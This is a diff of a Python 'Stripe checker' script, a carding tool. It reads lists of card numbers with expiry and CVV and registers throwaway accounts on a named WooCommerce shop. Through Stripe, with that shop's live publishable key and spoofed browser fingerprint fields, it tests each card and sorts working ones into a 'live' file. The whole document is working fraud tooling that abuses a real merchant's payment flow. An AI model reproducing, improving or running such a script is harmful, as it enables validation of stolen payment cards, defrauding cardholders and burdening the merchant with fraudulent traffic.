@@ -1,5 +1,6 @@
 """
-WayuuMarket Stripe Checker v3.0 for Pydroid3
+WayuuMarket Stripe Checker v4.0
+Gets REAL decline/success responses
 """
 import requests
 import random
@@ -11,12 +12,12 @@ import re
 import json
 
 INPUT_FILE = "cards.txt"
-LIVE_FILE = "live.txt"
+LIVE_FILE = "live.txt"  
 DEAD_FILE = "dead.txt"
 DELAY = 3
 
 def log(msg):
-    print(f"[DEBUG] {msg}")
+    print(f"[*] {msg}")
 
 def randmail():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
@@ -39,121 +40,119 @@ def check_card(cc, mes, ano, cvv):
     s = requests.Session()
     s.headers.update({
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     })
     
-    # Step 1: Get registration page
-    log("Getting registration page...")
+    # Step 1: Register
+    log("Registering...")
     r = s.get('https://wayuumarket.com/my-account/', timeout=30)
     
     m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
     if not m:
         return 'ERROR', 'No register nonce'
     
-    reg_nonce = m.group(1)
-    log(f"Register nonce: {reg_nonce}")
-    
-    # Step 2: Register
     email = randmail()
-    log(f"Registering: {email}")
-    
-    r = s.post('https://wayuumarket.com/my-account/', data={
+    s.post('https://wayuumarket.com/my-account/', data={
         'email': email,
-        'woocommerce-register-nonce': reg_nonce,
-        '_wp_http_referer': '/my-account/',
+        'woocommerce-register-nonce': m.group(1),
         'register': 'Register',
     }, timeout=30)
     
-    if 'log out' in r.text.lower() or 'dashboard' in r.text.lower():
-        log("Registered!")
-    else:
-        log("Registration might have failed")
-    
-    # Step 3: Get add-payment-method page
-    log("Getting add-payment-method page...")
+    # Step 2: Get add-payment-method page and extract ALL data
+    log("Getting payment page...")
     r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
     html = r.text
     
-    # Find the createSetupIntentNonce specifically
+    # Find setup intent nonce - search entire page
     setup_nonce = None
     
-    # Try to find wc_stripe_params JSON
-    params_match = re.search(r'var\s+wc_stripe_params\s*=\s*(\{.*?\});', html, re.DOTALL)
-    if params_match:
-        try:
-            # Clean up the JSON
-            params_text = params_match.group(1)
-            # Find createSetupIntentNonce in it
-            nonce_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params_text)
-            if nonce_match:
-                setup_nonce = nonce_match.group(1)
-                log(f"Found createSetupIntentNonce: {setup_nonce}")
-        except:
-            pass
+    # Try to find in wc_stripe_params
+    for pattern in [
+        r'wc_stripe_params\s*=\s*(\{[^<]+\})\s*;',
+        r'var\s+wc_stripe_params\s*=\s*(\{.*?\});',
+    ]:
+        m = re.search(pattern, html, re.DOTALL)
+        if m:
+            params_str = m.group(1)
+            # Look for nonce
+            n = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params_str)
+            if n:
+                setup_nonce = n.group(1)
+                log(f"Found nonce: {setup_nonce[:15]}...")
+                break
     
-    # Try other patterns
+    # Try direct search
     if not setup_nonce:
-        patterns = [
+        for p in [
             r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
-            r'createSetupIntentNonce["\s:]+["\']([^"\']+)',
-            r'"create_setup_intent_nonce"\s*:\s*"([^"]+)"',
-        ]
-        for p in patterns:
+            r'createSetupIntentNonce[\'"\s:]+[\'"]([^\'"]+)[\'"]',
+            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
+        ]:
             m = re.search(p, html)
             if m:
                 setup_nonce = m.group(1)
-                log(f"Found setup nonce: {setup_nonce}")
+                log(f"Found nonce: {setup_nonce}")
                 break
     
-    if not setup_nonce:
-        log("No setup intent nonce found, trying PM only")
+    # Step 3: Create Payment Method with radar token
+    log("Creating payment method...")
     
-    # Step 4: Create Payment Method
-    log(f"Creating PM...")
+    guid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
+    muid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
+    sid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
     
-    guid = str(uuid.uuid4())
+    pm_data = {
+        'type': 'card',
+        'billing_details[name]': 'John Smith',
+        'billing_details[email]': email,
+        'card[number]': cc,
+        'card[cvc]': cvv,
+        'card[exp_month]': mes,
+        'card[exp_year]': ano,
+        'guid': guid,
+        'muid': muid,
+        'sid': sid,
+        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
+        'referrer': 'https://wayuumarket.com',
+        'time_on_page': str(random.randint(80000, 200000)),
+        'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
+        '_stripe_version': '2024-06-20',
+    }
     
-    pm_resp = requests.post('https://api.stripe.com/v1/payment_methods',
+    pm_resp = requests.post(
+        'https://api.stripe.com/v1/payment_methods',
         headers={
-            'authority': 'api.stripe.com',
             'accept': 'application/json',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
         },
-        data={
-            'type': 'card',
-            'billing_details[name]': 'John Smith',
-            'billing_details[email]': email,
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_month]': mes,
-            'card[exp_year]': ano,
-            'guid': guid,
-            'muid': guid,
-            'sid': guid,
-            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
-            'referrer': 'https://wayuumarket.com',
-            'time_on_page': str(random.randint(50000, 150000)),
-            'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
-        },
+        data=pm_data,
         timeout=30
     ).json()
     
-    log(f"PM response: {str(pm_resp)[:100]}")
-    
-    # Check PM errors
+    # Check PM errors - these are REAL responses
     if 'error' in pm_resp:
         err = pm_resp['error']
         code = err.get('decline_code') or err.get('code', '')
         msg = err.get('message', '')
         
-        ccn_codes = ['incorrect_cvc', 'invalid_cvc', 'insufficient_funds', 'generic_decline',
-                     'expired_card', 'lost_card', 'stolen_card', 'do_not_honor', 
-                     'card_velocity_exceeded', 'pickup_card', 'restricted_card']
+        # CCN - Card is LIVE but has issues
+        ccn_codes = [
+            'incorrect_cvc', 'invalid_cvc', 'insufficient_funds', 
+            'generic_decline', 'expired_card', 'lost_card', 'stolen_card',
+            'do_not_honor', 'card_velocity_exceeded', 'pickup_card',
+            'restricted_card', 'security_violation', 'fraudulent',
+            'transaction_not_allowed', 'card_not_supported'
+        ]
         
         if code in ccn_codes:
-            return 'CCN', code
+            return 'CCN', f"Declined: {code}"
+        
+        if 'Your card was declined' in msg:
+            return 'CCN', 'Card Declined'
+        
+        if 'invalid' in msg.lower() or 'invalid' in code.lower():
+            return 'DEAD', f"Invalid: {code or msg[:30]}"
         
         return 'DEAD', code or msg[:40]
     
@@ -161,19 +160,17 @@ def check_card(cc, mes, ano, cvv):
     if not pm_id:
         return 'ERROR', 'No PM ID'
     
-    log(f"PM created: {pm_id}")
+    log(f"PM: {pm_id[:20]}...")
     
-    # Step 5: Create Setup Intent (if we have nonce)
+    # Step 4: Try setup intent if we have nonce
     if setup_nonce:
-        log(f"Creating setup intent...")
+        log("Confirming setup intent...")
         
-        setup_resp = s.post(
+        si_resp = s.post(
             'https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent',
             headers={
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://wayuumarket.com',
-                'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
                 'x-requested-with': 'XMLHttpRequest',
             },
             data={
@@ -183,71 +180,81 @@ def check_card(cc, mes, ano, cvv):
             timeout=30
         )
         
-        log(f"Setup response: {setup_resp.text[:150]}")
-        
         try:
-            j = setup_resp.json()
+            j = si_resp.json()
+            log(f"Response: {str(j)[:100]}")
             
+            # Success!
             if j.get('success') == True:
                 return 'CHARGED', 'Card Added Successfully!'
             
-            if j.get('status') == 'succeeded':
-                return 'CHARGED', 'Setup Succeeded!'
-            
-            if j.get('status') == 'requires_action':
-                return 'CCN', '3DS Required'
-            
-            err = j.get('error', {})
+            # Check for decline in response
+            err = j.get('error', '')
             if isinstance(err, dict):
-                err_msg = err.get('message', '')
-            else:
-                err_msg = str(err)
+                err = err.get('message', str(err))
             
-            if 'verify your request' in err_msg.lower():
-                # Nonce issue - fall back to PM result
-                log("Nonce invalid, using PM result")
-                return 'LIVE', f'PM Created ({pm_resp.get("card",{}).get("brand","").upper()})'
+            err_str = str(err).lower()
             
-            if any(x in err_msg.lower() for x in ['cvc', 'decline', 'insufficient', 'lost', 'stolen']):
-                return 'CCN', err_msg[:30]
-            
-            if 'authentication' in err_msg.lower() or '3d' in err_msg.lower():
+            # Real decline responses
+            if 'declined' in err_str:
+                return 'CCN', 'Card Declined'
+            if 'insufficient' in err_str:
+                return 'CCN', 'Insufficient Funds'
+            if 'cvc' in err_str or 'security' in err_str:
+                return 'CCN', 'CVC Failed'
+            if 'expired' in err_str:
+                return 'CCN', 'Card Expired'
+            if 'lost' in err_str or 'stolen' in err_str:
+                return 'CCN', 'Lost/Stolen Card'
+            if 'authentication' in err_str or '3d' in err_str:
                 return 'CCN', '3DS Required'
-            
+            if 'verify your request' in err_str:
+                # Nonce issue - use PM result
+                pass
+            else:
+                if err:
+                    return 'DEAD', str(err)[:40]
         except:
             pass
     
-    # PM was created = card is valid
-    brand = pm_resp.get('card', {}).get('brand', 'unknown').upper()
-    return 'LIVE', f'PM Created ({brand})'
+    # If we got here, PM was created = card format is valid
+    # But we didn't get a real charge response
+    brand = pm_resp.get('card', {}).get('brand', '').upper()
+    checks = pm_resp.get('card', {}).get('checks', {})
+    cvc_check = checks.get('cvc_check', '')
+    
+    if cvc_check == 'fail':
+        return 'CCN', 'CVC Check Failed'
+    elif cvc_check == 'pass':
+        return 'LIVE', f'Valid Card ({brand})'
+    else:
+        return 'LIVE', f'Card Valid ({brand})'
 
 def main():
     print("""
     ╔═══════════════════════════════════════╗
-    ║    WAYUUMARKET STRIPE CHECKER v3.0    ║
-    ║           FOR PYDROID3                ║
-    ║     WooCommerce Setup Intent Gate     ║
+    ║    WAYUUMARKET CHECKER v4.0           ║
+    ║    Real Decline Responses             ║
     ╚═══════════════════════════════════════╝
     """)
     
     if not os.path.exists(INPUT_FILE):
         with open(INPUT_FILE, 'w') as f:
             f.write("# cc|mm|yy|cvv\n")
-        print(f"[*] Created {INPUT_FILE}")
+        print(f"Created {INPUT_FILE}")
         return
     
     with open(INPUT_FILE, 'r') as f:
         cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
     
     if not cards:
-        print("[!] No cards")
+        print("No cards!")
         return
     
-    print(f"[*] Cards: {len(cards)}")
-    print(f"[*] Delay: {DELAY}s")
-    print("=" * 45)
+    print(f"Cards: {len(cards)}")
+    print("=" * 40)
     
-    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0}
+    charged = ccn = live = dead = 0
     
     for i, card in enumerate(cards, 1):
         p = card.split('|')
@@ -257,34 +264,54 @@ def main():
         cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
         full = f"{cc}|{mes}|{ano}|{cvv}"
         
-        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]}")
+        print(f"\n[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
         
         start = time.time()
         status, msg = check_card(cc, mes, ano, cvv)
         t = round(time.time() - start, 2)
         
-        if status in ['CHARGED', 'CCN', 'LIVE']:
-            symbol = 'CHARGED' if status == 'CHARGED' else ('CCN' if status == 'CCN' else 'LIVE')
-            print(f"[{symbol}] {full}")
-            print(f"[+] {msg}")
-            print(f"[+] {get_bin(cc)}")
-            stats[status.lower()] = stats.get(status.lower(), 0) + 1
+        if status == 'CHARGED':
+            print(f"✓ [CHARGED] {full}")
+            print(f"  {msg}")
+            print(f"  {get_bin(cc)}")
+            charged += 1
             with open(LIVE_FILE, 'a') as f:
-                f.write(f"{full}|{status}|{msg}\n")
+                f.write(f"{full}|CHARGED|{msg}\n")
+                
+        elif status == 'CCN':
+            print(f"● [CCN] {full}")
+            print(f"  {msg}")
+            print(f"  {get_bin(cc)}")
+            ccn += 1
+            with open(LIVE_FILE, 'a') as f:
+                f.write(f"{full}|CCN|{msg}\n")
+                
+        elif status == 'LIVE':
+            print(f"○ [LIVE] {full}")
+            print(f"  {msg}")
+            print(f"  {get_bin(cc)}")
+            live += 1
+            with open(LIVE_FILE, 'a') as f:
+                f.write(f"{full}|LIVE|{msg}\n")
+                
         else:
-            print(f"[DEAD] {full}")
-            print(f"[-] {msg}")
-            stats['dead'] += 1
+            print(f"✗ [DEAD] {full}")
+            print(f"  {msg}")
+            dead += 1
             with open(DEAD_FILE, 'a') as f:
                 f.write(f"{full}|{msg}\n")
         
-        print(f"[*] {t}s")
+        print(f"  [{t}s]")
         
         if i < len(cards):
             time.sleep(DELAY)
     
-    print("\n" + "=" * 45)
-    print(f"CHARGED: {stats.get('charged',0)} | CCN: {stats.get('ccn',0)} | LIVE: {stats.get('live',0)} | DEAD: {stats['dead']}")
+    print("\n" + "=" * 40)
+    print(f"CHARGED: {charged}")
+    print(f"CCN:     {ccn}")
+    print(f"LIVE:    {live}")
+    print(f"DEAD:    {dead}")
+    print("=" * 40)
 
 if __name__ == "__main__":
     main()
